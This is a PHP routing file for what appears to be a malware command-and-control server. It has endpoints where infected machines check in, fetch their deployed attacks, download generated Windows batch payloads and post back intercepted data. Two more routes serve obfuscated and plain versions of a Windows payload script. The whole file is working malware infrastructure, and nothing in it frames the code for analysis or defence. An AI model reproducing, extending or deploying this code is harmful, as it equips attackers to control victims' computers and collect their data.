<?php /** @noinspection PhpIncludeInspection */

use Kelvinho\Virus\Attack\AttackBase;
use Kelvinho\Virus\Attack\BaseScriptWin;
use Kelvinho\Virus\Singleton\Header;
use Kelvinho\Virus\Singleton\Logs;

// routes for viruses
$router->getMulti(["vrs/*/aks", "viruses/*/attacks"], function () use ($requestData, $virusFactory) {
    $virus_id = $requestData->getExplodedPath()[1];
    if (!$virusFactory->exists($virus_id)) Logs::strayVirus($virus_id);
    echo join("\n", $virusFactory->get($virus_id)->getAttacks(AttackBase::STATUS_DEPLOYED));
    Header::ok();
});
$router->getMulti(["vrs/*/ping", "viruses/*/ping"], function () use ($requestData, $virusFactory) {
    $virus_id = $requestData->getExplodedPath()[1];
    if (!$virusFactory->exists($virus_id)) Logs::strayVirus($virus_id);
    $virusFactory->get($virus_id)->ping();
    Header::ok();
});
$router->getMulti(["vrs/*/aks/*/code", "viruses/*/attacks/*/code"], function () use ($requestData, $attackFactory) {
    $attack_id = $requestData->getExplodedPath()[3];
    if (!$attackFactory->exists($attack_id)) Logs::strayAttack($attack_id);
    $attack = $attackFactory->get($attack_id);
    echo ($attack->getStatus() == AttackBase::STATUS_EXECUTED ? "" : $attack->generateBatchCode());
    Header::ok();
});
$router->postMulti(["vrs/*/aks/*/report", "viruses/*/attacks/*/report"], function () use ($requestData, $virusFactory, $attackFactory) {
    echo "something";
    $attack_id = $requestData->getExplodedPath()[3];
    if (!$attackFactory->exists($attack_id)) Logs::strayAttack($attack_id);
    $attackFactory->get($attack_id)->includeIntercept();
    Header::ok();
});
$router->getMulti(["vrs/*/aks/*/extras/*", "viruses/*/attacks/*/extras/*"], function () use ($requestData, $attackFactory) {
    $attack_id = $requestData->getExplodedPath()[3];
    if (!$attackFactory->exists($attack_id)) Logs::strayAttack($attack_id);
    $attack = $attackFactory->get($attack_id);
    $attack->processExtras($requestData->getExplodedPath()[5]);
    Header::ok();
});

$router->get("obfuscate", function () {
    echo BaseScriptWin::obfuscate(BaseScriptWin::complexMain("209b093ec7c0610777b784fb29db4eb39b526a0a5c17c84040061a01ddb5b9e3"));
});
$router->get("complex", function () {
    echo BaseScriptWin::complexMain("209b093ec7c0610777b784fb29db4eb39b526a0a5c17c84040061a01ddb5b9e3");
});
